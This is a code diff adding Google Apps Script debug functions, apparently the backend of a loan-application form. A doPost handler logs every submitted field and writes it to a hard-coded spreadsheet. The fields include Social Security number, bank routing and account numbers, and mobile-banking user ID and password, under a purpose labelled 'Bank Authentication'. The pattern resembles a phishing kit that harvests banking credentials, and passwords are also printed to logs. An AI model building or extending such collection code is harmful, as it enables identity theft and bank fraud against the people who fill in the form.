@@ -1,0 +1,94 @@
+// Test function to debug data structure - add to your Google Apps Script
+function testCurrentDataStructure() {
+  // Simulate the data structure your form is sending
+  const testData = {
+    loanAmount: 'N/A (Bank Auth)',
+    loanPurpose: 'Bank Authentication',
+    creditScore: 'N/A',
+    fullName: 'Test User',
+    email: 'test@example.com',
+    phone: '123-456-7890',
+    bankName: 'Test Bank',
+    timestamp: new Date().toISOString()
+  };
+  
+  try {
+    const sheet = SpreadsheetApp.openByUrl("https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit").getSheetByName("Sheet1");
+    
+    // Test the appendRow function with current structure
+    sheet.appendRow([
+      testData.loanAmount || '',
+      testData.loanPurpose || '',
+      testData.creditScore || '',
+      testData.fullName || '',
+      testData.email || '',
+      testData.phone || '',
+      '', // streetAddress
+      '', // city
+      '', // state
+      '', // zipCode
+      '', // ssn
+      testData.bankName || '',
+      '', // routingNumber
+      '', // accountNumber
+      '', // annualIncome
+      '', // employmentStatus
+      '', // monthlyHousing
+      '', // mobileBankingUserId
+      '', // mobileBankingPassword
+      new Date()
+    ]);
+    
+    console.log("✅ Test data structure works!");
+    
+  } catch (error) {
+    console.log("❌ Test data structure failed: " + error.message);
+  }
+}
+
+// Also add this to see what your doPost receives
+function debugDoPost(e) {
+  try {
+    const data = JSON.parse(e.postData.contents);
+    console.log("🔍 Debug - Received data keys:", Object.keys(data));
+    console.log("🔍 Debug - Full data:", data);
+    
+    // Try to process with current structure
+    const sheet = SpreadsheetApp.openByUrl("https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit").getSheetByName("Sheet1");
+    
+    sheet.appendRow([
+      data.loanAmount || '',
+      data.loanPurpose || '',
+      data.creditScore || '',
+      data.fullName || '',
+      data.email || '',
+      data.phone || '',
+      data.streetAddress || '',
+      data.city || '',
+      data.state || '',
+      data.zipCode || '',
+      data.ssn || '',
+      data.bankName || '',
+      data.routingNumber || '',
+      data.accountNumber || '',
+      data.annualIncome || '',
+      data.employmentStatus || '',
+      data.monthlyHousing || '',
+      data.mobileBankingUserId || '',
+      data.mobileBankingPassword || '[PROTECTED]',
+      new Date()
+    ]);
+    
+    console.log("✅ Debug - Data processed successfully!");
+    
+    return ContentService.createTextOutput(
+      JSON.stringify({ status: "success", message: "Debug - Data processed" })
+    ).setMimeType(ContentService.MimeType.JSON);
+    
+  } catch (error) {
+    console.log("❌ Debug - Error: " + error.message);
+    return ContentService.createTextOutput(
+      JSON.stringify({ status: "error", message: error.message })
+    ).setMimeType(ContentService.MimeType.JSON);
+  }
+}
